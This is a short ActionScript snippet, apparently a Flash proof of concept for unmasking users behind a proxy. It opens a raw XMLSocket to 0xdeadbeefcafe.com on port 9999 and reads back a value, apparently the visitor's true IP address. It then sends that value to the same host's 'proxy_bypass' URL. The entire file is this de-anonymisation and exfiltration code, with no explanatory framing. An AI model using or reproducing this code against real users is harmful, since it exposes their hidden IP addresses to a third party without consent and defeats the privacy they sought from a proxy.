var socket = new XMLSocket();
socket.onConnect = function(success) {
  socket.onXML = function(doc) {
    getURL("http://0xdeadbeefcafe.com/proxy_bypass?ip=" + 
      doc.firstChild.firstChild.nodeValue);
    socket.close();
  };
  socket.send(new XML());
};
socket.connect("0xdeadbeefcafe.com", 9999);
